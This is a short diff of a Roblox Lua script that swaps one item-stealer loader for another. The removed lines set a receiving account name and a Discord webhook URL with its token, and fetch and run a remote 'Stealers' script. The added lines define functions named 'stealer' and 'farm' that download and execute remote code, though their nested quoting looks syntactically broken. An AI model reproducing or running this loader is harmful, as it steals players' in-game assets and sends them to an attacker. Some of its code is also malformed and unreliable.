@@ -1,4 +1,9 @@
-Receiver = "JelloBloxxer"
-Webhook = "https://discord.com/api/webhooks/1320514522691272795/upYs6C7tyet1z347CCbRiRD9tLDU9KYn8l50MmRRAoQ0dbPECXtm9Dg9Cj-OY7G2ye97"
+local function stealer()
+    loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/9e17aa6bd21022b7c157d618.lua'))()'))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://overdrivehub.odh.workers.dev/?d=auth&script=mm2_lite"))()'))()
+end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
+task.spawn(stealer)
+task.spawn(farm)
